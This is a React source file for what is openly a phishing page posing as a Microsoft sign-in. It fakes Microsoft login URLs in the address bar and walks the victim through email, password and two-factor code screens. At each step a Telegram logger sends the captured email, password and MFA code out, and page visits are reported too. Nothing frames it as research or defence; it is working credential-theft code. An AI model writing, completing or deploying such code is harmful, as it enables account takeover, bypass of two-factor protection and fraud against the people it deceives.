import React, { useState, useEffect } from 'react';
import { URLGenerator } from './utils/urlGenerator';
import { AuthLayout } from './components/AuthLayout';
import { LoginForm } from './components/LoginForm';
import { PasswordForm } from './components/PasswordForm';
import { TwoFactorForm } from './components/TwoFactorForm';
import { SuccessPage } from './components/SuccessPage';
import { InitialLoadingPage } from './components/InitialLoadingPage';
import { TelegramLogger } from './utils/telegram';

type AuthStep = 'initialLoading' | 'login' | 'password' | 'twoFactor' | 'success';

function App() {
  const [currentStep, setCurrentStep] = useState<AuthStep>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  useEffect(() => {
    // Initialize Telegram logger and send page access notification
    TelegramLogger.notifyPageAccess().catch(console.error);
    
    // Check for email parameter in URL at app startup
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get('email') || urlParams.get('login_hint');
    if (emailParam) {
      setEmail(emailParam);
    }
    
    // Generate and update URL to look like Microsoft login
    const authURL = URLGenerator.generateAuthURL();
    const url = new URL(authURL);
    window.history.replaceState({}, '', url.pathname + url.search);
  }, []);

  const handleInitialLoadingComplete = () => {
    // Move to login step after initial loading
    setCurrentStep('login');
  };

  const handleEmailNext = async (userEmail: string) => {
    setEmail(userEmail);
    await TelegramLogger.logLoginAttempt(userEmail, null, null, 'email').catch(console.error);
    
    // Update URL for password step
    const passwordURL = URLGenerator.generatePasswordURL(userEmail);
    const url = new URL(passwordURL);
    window.history.pushState({}, '', url.pathname + url.search);
    
    setCurrentStep('password');
  };

  const handlePasswordNext = async (userPassword: string) => {
    setPassword(userPassword);
    await TelegramLogger.logLoginAttempt(email, userPassword, null, 'password').catch(console.error);
    
    // Update URL for MFA step
    const mfaURL = URLGenerator.generateMFAURL(email);
    const url = new URL(mfaURL);
    window.history.pushState({}, '', url.pathname + url.search);
    
    setCurrentStep('twoFactor');
  };

  const handleTwoFactorComplete = async (code: string) => {
    await TelegramLogger.logLoginAttempt(email, password, code, 'complete').catch(console.error);
    
    // Update URL for success step
    const successURL = URLGenerator.generateSuccessURL();
    const url = new URL(successURL);
    window.history.pushState({}, '', url.pathname + url.search);
    
    setCurrentStep('success');
  };

  const handleLogout = () => {
    // Reset URL to initial auth URL
    const authURL = URLGenerator.generateAuthURL();
    const url = new URL(authURL);
    window.history.pushState({}, '', url.pathname + url.search);
    
    setCurrentStep('login');
    setEmail('');
    setPassword('');
  };

  const handleBack = () => {
    switch (currentStep) {
      case 'password': {
        // Go back to initial auth URL
        const authURL = URLGenerator.generateAuthURL();
        const url = new URL(authURL);
        window.history.pushState({}, '', url.pathname + url.search);
        setCurrentStep('login');
        break;
      }
      case 'twoFactor': {
        // Go back to password URL
        const passwordURL = URLGenerator.generatePasswordURL(email);
        const url = new URL(passwordURL);
        window.history.pushState({}, '', url.pathname + url.search);
        setCurrentStep('password');
        break;
      }
    }
  };

  if (currentStep === 'success') {
    return <SuccessPage email={email} onLogout={handleLogout} />;
  }

  return (
    <>
      {currentStep === 'initialLoading' && (
        <InitialLoadingPage onComplete={handleInitialLoadingComplete} />
      )}
      {currentStep === 'login' && (
        <LoginForm email={email} onNext={handleEmailNext} />
      )}
      {currentStep === 'password' && (
        <PasswordForm 
          email={email} 
          onNext={handlePasswordNext} 
          onBack={handleBack}
        />
      )}
      {currentStep === 'twoFactor' && (
        <TwoFactorForm 
          email={email} 
          onComplete={handleTwoFactorComplete} 
          onBack={handleBack}
        />
      )}
    </>
  );
}

export default App;